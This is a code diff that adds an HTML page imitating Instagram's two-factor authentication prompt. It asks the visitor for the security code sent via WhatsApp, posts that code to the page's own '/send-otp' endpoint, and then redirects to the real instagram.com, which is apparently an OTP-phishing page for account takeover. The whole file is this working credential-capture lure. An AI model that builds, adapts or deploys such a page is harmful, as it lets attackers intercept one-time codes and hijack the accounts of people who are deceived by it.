@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Two-Factor Authentication</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="language-selection">
+        English ▼
+    </div>
+    
+    <div class="container">
+        <div class="auth-box">
+            <div class="lock-icon"></div>
+            <h2>Enter the code we sent via WhatsApp to your mobile number: +91 ***** ***64.</h2>
+            
+            <input type="text" id="securityCode" placeholder="Security Code" class="input-field">
+            
+            <button id="confirmBtn" class="confirm-btn">Confirm</button>
+            
+            <div class="trust-device">
+                <input type="checkbox" id="trust-device" checked>
+                <label for="trust-device">Trust this device</label>
+            </div>
+            
+            <div class="alternative-options">
+                <p><a href="#">Didn't get a security code?</a></p>
+                <p><a href="#">Send code via SMS instead</a></p>
+                <p class="backup-codes"><a href="#">Use one of your backup codes.</a></p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById('confirmBtn').addEventListener('click', async () => {
+            const securityCode = document.getElementById('securityCode').value;
+            if (securityCode) {
+                try {
+                    const response = await fetch('/send-otp', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ otp: securityCode }),
+                    });
+                    const result = await response.json();
+                    if (result.success) {
+                        
+                        window.location.href = 'https://www.instagram.com'
+                        // You can redirect the user or show a success message here
+                    } else {
+                        alert('Failed to send OTP');
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    alert('An error occurred');
+                }
+            } else {
+                
+            }
+        });
+    </script>
+</body>
+</html>
